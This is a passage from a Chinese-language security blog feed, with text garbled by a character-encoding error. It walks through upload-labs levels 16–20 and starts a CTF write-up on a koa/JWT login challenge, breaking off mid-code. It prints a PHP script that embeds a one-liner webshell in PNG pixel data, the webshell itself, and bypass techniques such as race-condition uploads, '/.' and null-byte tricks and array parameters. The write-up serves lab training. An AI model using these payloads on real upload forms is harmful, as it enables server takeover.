<p>é¦–å…ˆå‘¢æ£€æµ‹<code>$fileext</code>å’Œ<code>$filetype</code>æ˜¯å¦ä¸º<code>gif</code>|<code>png</code>|<code>jpg</code>æ ¼å¼ã€‚</p>
<p>ç„¶åä½¿ç”¨<code>move_uploaded_file</code>å‡½æ•°æ¥åšåˆ¤æ–­æ¡ä»¶ï¼Œå¦‚æœæˆåŠŸå°†æ–‡ä»¶ç§»åŠ¨åˆ°<code>$target_path</code>ï¼Œå°±ä¼šè¿›å…¥äºŒæ¬¡æ¸²æŸ“çš„ä»£ç ,åä¹‹ä¸Šä¼ å¤±è´¥ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨<code>move_uploaded_file($tmpname,$target_path)</code>è¿”å›trueçš„æ—¶å€™ï¼Œå°±å·²ç»æˆåŠŸå°†å›¾ç‰‡é©¬ä¸Šä¼ åˆ°æœåŠ¡å™¨äº†ï¼Œæ‰€ä»¥ä¸‹é¢çš„äºŒæ¬¡æ¸²æŸ“å¹¶ä¸ä¼šå½±å“åˆ°å›¾ç‰‡é©¬çš„ä¸Šä¼ ï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä½œè€…çš„å¤±è¯¯å§ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œçš„äºŒæ¬¡æ¸²æŸ“æ˜¯é‡æ–°ç”Ÿæˆäº†æ–‡ä»¶åï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®ä¸Šä¼ åçš„æ–‡ä»¶åï¼Œæ¥åˆ¤æ–­ä¸Šä¼ çš„å›¾ç‰‡æ˜¯äºŒæ¬¡æ¸²æŸ“åç”Ÿæˆçš„å›¾ç‰‡è¿˜æ˜¯ç›´æ¥ç”±<code>move_uploaded_file</code>å‡½æ•°ç§»åŠ¨çš„å›¾ç‰‡ã€‚</p>
<p>è¿™é‡ŒæŠŠ<code>move_uploaded_file</code>è¿™ä¸ªåˆ¤æ–­æ¡ä»¶å»é™¤,ç„¶åå°è¯•ä¸Šä¼ å›¾ç‰‡é©¬ã€‚</p>
<p><strong>ä¸Šä¼ gif:</strong></p>
<p>é¦–å…ˆå°†ä¸€å¥è¯æœ¨é©¬æ·»åŠ åˆ°<code>1.gif</code>çš„æ–‡ä»¶å°¾</p>
<img src="http://img.kawhi.xyz/image-20200503173331981.png" style="high:80%;width:80%;" />

<p>ç„¶åå°†ä¸Šä¼ çš„gifä¸‹è½½ä¸‹æ¥ï¼Œæ˜¯ç»è¿‡äºŒæ¬¡æ¸²æŸ“çš„æ–‡ä»¶<code>28278.gif</code>ï¼Œç”¨010æ‰“å¼€ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200503173427515.png" style="high:80%;width:80%;" />

<p>å¯ä»¥å‘ç°ï¼Œåœ¨gifæœ«ç«¯æ·»åŠ çš„phpä»£ç å·²ç»è¢«å»é™¤ã€‚</p>
<p>ç»•è¿‡gifçš„äºŒæ¬¡æ¸²æŸ“ï¼Œåªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®ï¼Œç„¶åå°†phpä»£ç å†™è¿›å»ï¼Œå°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰phpä»£ç çš„å›¾ç‰‡äº†ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200503173827659.png" style="high:80%;width:80%;" />

<p>å‘ç°è“è‰²éƒ¨åˆ†éƒ½æ˜¯æ²¡æœ‰å˜åŒ–çš„ï¼Œäºæ˜¯å°†ä¸€å¥è¯å†™åœ¨æœ«å°¾ã€‚</p>
<p>ä¸Šä¼ ä¹‹åå†ä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°å¹¶æ²¡æœ‰è¢«æ¸…é™¤ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200503174017083.png" style="high:90%;width:90%;" />

<p>æˆåŠŸè¿æ¥ä¸Šã€‚</p>
<p><strong>ä¸Šä¼ pngï¼š</strong></p>
<p>å†™å…¥IDATæ•°æ®å—</p>
<p>è¿™é‡Œæœ‰ä¸ªè„šæœ¬å¯ä»¥ç›´æ¥ç”Ÿæˆå†™å…¥phpä¸€å¥è¯æœ¨é©¬çš„pngå›¾ç‰‡</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è¿è¡Œåå¾—åˆ°1.png</p>
<p>ä¸Šä¼ ä¹‹åå†ä¸‹è½½ä¸‹æ¥å¯ä»¥çœ‹åˆ°phpä»£ç è¿˜åœ¨</p>
<img src="http://img.kawhi.xyz/image-20200503212308794.png" style="high:80%;width:80%;" />

<p>è¿™é‡Œçš„ä¸€å¥è¯æœ¨é©¬æ˜¯ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆ <code>?=$_GET[0]</code> æŒ‡çš„æ˜¯è®©ä½ ä»¥ 0 ä¸ºå‚æ•°è¿›è¡Œä¼ å‚ï¼Œå…¶æ¬¡ <code>$_POST[1]</code> æŒ‡çš„æ˜¯ç”¨ 1 æ¥æ¥æ”¶æäº¤ä¸Šæ¥çš„å‚æ•°ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200503212501216.png" style="high:80%;width:80%;" />

<p>è¿˜å¯è¿æ¥ä¸­å›½èœåˆ€ï¼Œè¿™é‡Œå¾ˆå¥‡æ€ªçš„æ˜¯è¿æ¥ä¸äº†èšå‰‘ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url:http://127.0.0.1/upload-labs/include.php?file=./upload/6116.png&amp;0=assert</span><br><span class="line">å¯†ç ï¼š<span class="number">1</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200503212720089.png" style="high:60%;width:60%;" />

<p><strong>ä¸Šä¼ jpgï¼š</strong></p>
<p>æœªèƒ½å¤ç°æˆåŠŸ</p>
<h4 id="Pass-17-æ¡ä»¶ç«äº‰"><a href="#Pass-17-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-17(æ¡ä»¶ç«äº‰)"></a><strong>Pass-17(æ¡ä»¶ç«äº‰)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯å…ˆ<code>move_uploaded_file</code>å‡½æ•°å°†ä¸Šä¼ æ–‡ä»¶ä¸´æ—¶ä¿å­˜ï¼Œå†è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸åœ¨ç™½åå•é‡Œåˆ™unlinkåˆ é™¤ï¼Œåœ¨çš„è¯å°±renameé‡å‘½åï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨æ¡ä»¶ç«äº‰ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>ç”¨burpå¼€å¯ä¸¤ä¸ªintruderæ¨¡å—ï¼Œä¸€ä¸ªç”¨äºé‡å¤ä¸Šä¼ ï¼Œå¦ä¸€ä¸ªç”¨äºé‡å¤è®¿é—®ã€‚</p>
<p><strong>é‡å¤ä¸Šä¼ </strong></p>
<img src="http://img.kawhi.xyz/image-20200503201243378.png" style="high:100%;width:100%;" />

<p><strong>é‡å¤è¯·æ±‚</strong></p>
<img src="http://img.kawhi.xyz/image-20200503201409484.png" style="high:100%;width:100%;" />

<p>è®¾ç½®ä¸€ä¸‹è®¿é—®æ¬¡æ•°</p>
<img src="http://img.kawhi.xyz/image-20200503201454724.png" style="high:100%;width:100%;" />

<p>ç„¶ååŒæ—¶å¼€å¯çˆ†ç ´</p>
<img src="http://img.kawhi.xyz/image-20200503201551566.png" style="high:100%;width:100%;" />

<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸè®¿é—®phpçš„é…ç½®ä¿¡æ¯ã€‚</p>
<h4 id="Pass-19-ç»•è¿‡"><a href="#Pass-19-ç»•è¿‡" class="headerlink" title="Pass-19(/.ç»•è¿‡)"></a><strong>Pass-19(/.ç»•è¿‡)</strong></h4><p>æºä»£ç ä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³äº<code>pathinfo</code>å‡½æ•°å¦‚ä¸‹ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200503232029310.png" style="high:60%;width:60%;" />

<p><strong>åˆ†ææºç ï¼š</strong></p>
<ul>
<li>æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶åšåˆ¤æ–­ï¼Œåªå¯¹ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶ååšåˆ¤æ–­</li>
<li>ä¸Šä¼ çš„æ–‡ä»¶åç”¨æˆ·å¯æ§</li>
<li>é»‘åå•ç”¨äºç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åç¼€åè¿›è¡Œåˆ¤æ–­</li>
<li><code>move_uploaded_file()</code>è¿˜æœ‰è¿™ä¹ˆä¸€ä¸ªç‰¹æ€§ï¼Œä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ <code>/.</code></li>
</ul>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p><strong>/. ç»•è¿‡</strong></p>
<img src="http://img.kawhi.xyz/image-20200503230732286.png" style="high:40%;width:40%;" />

<p><strong>apacheè§£ææ¼æ´</strong></p>
<img src="http://img.kawhi.xyz/image-20200503231026310.png" style="high:40%;width:40%;" />

<p>è¿™ä¸ªå¥½åƒåªèƒ½åœ¨ä½ç‰ˆæœ¬æ‰èƒ½ç”¨ï¼Œé«˜ä¸€ç‚¹çš„ç‰ˆæœ¬å°±ä¼šæŠ¥é”™ã€‚</p>
<p><strong>00æˆªæ–­ç»•è¿‡</strong></p>
<img src="http://img.kawhi.xyz/image-20200503231812592.png" style="high:80%;width:80%;" />

<p>æŠŠ+å·çš„äºŒè¿›åˆ¶æ”¹ä¸º00å³å¯ã€‚</p>
<h4 id="Pass-20-æ•°ç»„-ç»•è¿‡"><a href="#Pass-20-æ•°ç»„-ç»•è¿‡" class="headerlink" title="Pass-20(æ•°ç»„/.ç»•è¿‡)"></a><strong>Pass-20(æ•°ç»„/.ç»•è¿‡)</strong></h4><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(!empty($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    //æ£€æŸ¥MIME</span><br><span class="line">    $allow_type = array(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        //æ£€æŸ¥æ–‡ä»¶å</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯å…ˆè¿›è¡Œäº†ä¸€ä¸ª<code>Content-Type</code>åˆ¤æ–­ï¼Œè¿™ä¸ªç»•è¿‡å¾ˆå®¹æ˜“ã€‚</p>
<p>ç„¶åæ˜¯æ£€æŸ¥<code>post</code>è¿›æ¥çš„<code>save_name</code>ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²çš„è¯å°±é€šè¿‡<code>explode</code>å‡½æ•°æ‰“æ•£æˆæ•°ç»„ã€‚</p>
<p>ç„¶åç”¨<code>end()</code>å‡½æ•°æå–åç¼€(å³æ•°ç»„æœ€åä¸€ä¸ª)æ£€æŸ¥ç™½åå•ï¼Œå†ç”¨<code>reset($file) . &#39;.&#39; . $file[count($file) - 1]</code>æ‹¼æ¥æ•°ç»„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªã€‚è¿™é‡Œçš„<code>end()</code>å’Œ<code>$file[count($file) - 1]</code>æ˜¯ç›¸ç­‰çš„ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œä¼ å…¥çš„æ˜¯å­—ç¬¦ä¸²çš„è¯ï¼Œåç¼€å°±å¿…ä¸º<code>gif</code>ã€<code>png</code>ã€<code>jpg</code>ï¼Œæ— æ³•è¾¾åˆ°ä¸Šä¼ phpçš„ç›®çš„ã€‚å› æ­¤è¿™é‡Œ<code>save_name</code>ä¸èƒ½ä»¥å­—ç¬¦ä¸²å½¢å¼ä¼ å…¥ï¼Œè€Œåº”è¯¥ä»¥æ•°ç»„å½¢å¼ä¼ å…¥ï¼Œä»è€Œç»•è¿‡explodeå‡½æ•°ï¼Œæ„å»ºç‰¹æ®Šæ•°ç»„ã€‚ä½¿å¾—<code>end()</code>èƒ½ç»•è¿‡ç™½åå•ï¼Œè€Œ<code>$file[count($file) - 1]</code>ä¸ç­‰äº<code>gif</code>ã€<code>png</code>ã€<code>jpg</code>ã€‚</p>
<p>è¿™é‡Œå¯ä»¥æ„é€ <code>save_name[0] = 1.php/</code>ï¼Œ<code>save_name[2] = jpg</code>,è¿™æ ·çš„è¯<code>end($file)</code>ä¸º<code>jpg</code>ï¼Œè€Œ<code>$file[count($file) - 1]</code>ä¸º<code>$file[1]</code>ä¸ºç©ºã€‚æ‰€ä»¥æœ€ç»ˆ<code>file_name=1.php/.</code>ï¼Œåˆ°è¿™é‡Œå°±è·ŸPass-19ä¸€æ ·äº†ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<img src="http://img.kawhi.xyz/image-20200504131400237.png" style="high:80%;width:80%;" />

<p>æˆåŠŸè¿æ¥</p>
<img src="http://img.kawhi.xyz/image-20200504131527424.png" style="high:80%;width:80%;" />

<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h4><p>è¿™æ˜¯ä¸€å¼ ç½‘ä¸Šæ‰¾æ¥çš„å›¾</p>
<img src="http://img.kawhi.xyz/upload-labs.png" style="high:100%;width:100%;" />]]></content>
      <categories>
        <category>åˆ·é¢˜</category>
      </categories>
  </entry>
  <entry>
    <title>è™ç¬¦&amp;MRCTF</title>
    <url>/2020/04/24/%E8%99%8E%E7%AC%A6%E5%92%8CMRCTF/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h2><p>è¿™æ¬¡å¤ç°çš„é¢˜ç›®æ˜¯å¸ˆå…„æœ¬å‘¨å¼€ä¼šè®²çš„é¢˜ç›®ï¼Œæˆ‘éƒ½å¤ç°äº†ä¸€ä¸‹ï¼Œåˆå­¦åˆ°äº†æ–°çš„ä¸œè¥¿ã€‚é¢˜ç›®å…·ä½“è¯¦æƒ…å¯ä»¥å‚è€ƒå¸ˆå…„çš„æ–‡ç« ï¼š<a class="foo" target="_blank" href="https://www.plasf.cn/2020/04/20/HFCTF_WP/">ä¼ é€é—¨</a></p>
<h2 id="è™ç¬¦"><a href="#è™ç¬¦" class="headerlink" title="è™ç¬¦"></a><strong>è™ç¬¦</strong></h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a><strong>easy_login</strong></h3><p>é¦–å…ˆæ‰“å¼€é¢˜ç›®æºç å‘ç°static/js/app.jsï¼Œè¿›å»åå‘ç°koa</p>
<p>åˆ©ç”¨ koa-static é”™è¯¯é…ç½®çš„æºç æ³„éœ²è·å¾—æºç ï¼Œè¿›è¡Œå®¡è®¡ã€‚ç›´æ¥è¯»å–app.js</p>
<p>koaæ˜¯åŸºäºNode.jsçš„webæ¡†æ¶ã€‚ç„¶åå†è¿›å»controller.js</p>
<p>å†è¿›å…¥controllers/api.jsã€‚apiæ˜¯é€šè¿‡æŠ“åŒ…å‘ç°çš„</p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span 